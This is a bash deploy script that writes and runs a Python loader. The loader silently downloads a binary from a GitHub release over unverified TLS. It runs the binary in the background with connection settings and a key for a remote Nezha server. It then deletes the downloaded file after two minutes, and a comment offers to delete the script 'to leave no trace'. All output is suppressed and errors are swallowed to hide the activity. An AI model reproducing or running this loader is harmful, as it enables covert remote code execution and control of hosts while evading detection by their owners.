#!/bin/bash

# 1. Define variables
PY_FILE="app.py"

# 2. Create the Python script with silent and self-destruct logic
cat << 'EOF' > $PY_FILE
import os
import subprocess
import time
import threading
import shutil
import sys

CONFIG = {
    "file_name": "theone",
    "download_url": "https://github.com/babama1001980/good/releases/download/npc/theone",
    "tmp_dir": ".tmp",
    "env": {
        "UUID": "faacf142-dee8-48c2-8558-641123eb939c",
        "NEZHA_SERVER": "nezha.mingfei1981.eu.org",
        "NEZHA_PORT": "443",
        "NEZHA_KEY": "7LHjlPcj7gRgOrTCxl"
    },
    "delay_seconds": 120
}

file_path = os.path.join(os.getcwd(), CONFIG["file_name"])
tmp_path = os.path.join(os.getcwd(), CONFIG["tmp_dir"])

def cleanup():
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        if os.path.exists(tmp_path):
            shutil.rmtree(tmp_path, ignore_errors=True)
    except:
        pass

def download_file():
    try:
        subprocess.run(
            ["curl", "-L", "-k", "-s", "-o", CONFIG["file_name"], CONFIG["download_url"]], 
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if os.path.exists(file_path):
            os.chmod(file_path, 0o755)
    except:
        sys.exit(1)

def self_destruct():
    time.sleep(CONFIG["delay_seconds"])
    cleanup()

def start_app():
    current_env = os.environ.copy()
    current_env.update(CONFIG["env"])
    try:
        timer_thread = threading.Thread(target=self_destruct)
        timer_thread.daemon = True
        timer_thread.start()
        process = subprocess.Popen(
            [f"./{CONFIG['file_name']}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=current_env
        )
        process.wait()
    except:
        cleanup()
        sys.exit(1)

if __name__ == "__main__":
    cleanup()
    download_file()
    start_app()
EOF

# 3. Run the script in the background and disown it
# This ensures it keeps running even after you close the terminal
nohup python3 $PY_FILE > /dev/null 2>&1 &

# 4. Optional: Remove the deploy script itself to leave no trace
# rm -- "$0"

echo "Deployment completed silently."